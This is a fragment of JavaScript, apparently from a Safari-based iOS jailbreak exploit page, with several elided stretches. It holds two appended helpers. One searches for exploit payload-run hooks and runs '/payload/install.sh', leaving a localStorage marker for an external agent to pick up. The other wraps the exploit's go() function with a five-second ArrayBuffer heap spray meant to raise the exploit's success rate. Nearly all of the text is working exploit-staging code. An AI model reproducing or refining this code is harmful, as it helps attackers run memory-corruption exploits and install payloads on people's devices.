...
// --- installer trigger stub (appended) ---
// After payload is mapped/executed, this helper will attempt to call common payload-run hooks.
// It is conservative: it tries several known global function names that some exploit stubs expose.
function jb_attempt_run_installer() {
  try {
    // avoid using async/await for compatibility with older Safari JS engines
    // check for common hook names and call synchronously if present
    var hooks = ['run_mach_o_payload','exec_payload','runPayload','start_payload','spawnPayload'];
    for (var i = 0; i < hooks.length; i++) {
      ...
      if (typeof window[h] === 'function') {
        try {
          ...
          try { console.log('[JB] hook failed', h, e); } catch(_) {}
        }
      }
    }
    // try a generic runFile if available
    if (typeof window.runFile === 'function') {
      try {
        window.runFile('/payload/install.sh');
        return true;
      } catch (e) {}
    }
    // fallback: write a marker to localStorage for an external agent to pick up
    try {
      localStorage.setItem('jb_pending_installer', JSON.stringify({ts:Date.now(), path:'/payload/install.sh'}));
    } catch (e) {}
    try { console.log('[JB] No installer hook found; marker written to localStorage.'); } catch(_) {}
    return false;
  } catch (e) {
    try { console.log('[JB] installer trigger failed', e); } catch(_) {}
    return false;
  }
}
// End of installer trigger stub

// Preheat wrapper: fixed 5s memory preheat to improve cold-boot success rate
(function(){
  // If there is no global go(), do nothing.
  if (typeof go !== 'function') return;

  // Avoid double-wrapping.
  if (go.__preheat_wrapped) return;

  // Save original
  var __orig_go = go;

  function preheatMemoryThen(cb) {
    try {
      console.log("JB: Preheating memory for 5 seconds...");
      var arr = [];
      var start = Date.now();

      // Conservative parameters to reduce OOM risk on low-memory devices.
      var ALLOC_CHUNK = 2000;    // allocations per iteration
      var BUF_SIZE = 0x1000;     // each allocation 4KB
      var MAX_HOLD = 20000;      // max number of buffers held before clearing

      function spray() {
        try {
          for (var i = 0; i < ALLOC_CHUNK; i++) {
            arr.push(new ArrayBuffer(BUF_SIZE));
            if (arr.length > MAX_HOLD) arr = [];
          }
        } catch (e) {
          // allocation may fail on low-memory devices — clear and continue
          arr = [];
        }
        ...
        if (Date.now() - start < 5000) {
          ...
          console.log("JB: Preheat done, starting exploit...");
          try { cb(); } catch(e){ try { console.error("JB: exploit threw", e); } catch(_) {} }
        }
      }
      ...
      // if anything goes wrong, fall back to running exploit immediately
      try { console.error("JB: preheat failed, running exploit immediately", e); } catch(_) {}
      try { cb(); } catch(_) {}
    }
  }

  // Replace global go() with preheat wrapper
  function preheat_wrapped_go() {
    // If page is hidden, wait until visible
    if (typeof document !== 'undefined' && document.hidden) {
      var onvis = function() {
        document.removeEventListener('visibilitychange', onvis);
        preheatMemoryThen(__orig_go);
      };
  ...
  preheat_wrapped_go.__preheat_wrapped = true;

  // Export original for debugging if needed
  preheat_wrapped_go.__orig = __orig_go;

  // override
  go = preheat_wrapped_go;

  try { console.log("JB: preheat wrapper installed for go()"); } catch(_) {}
})();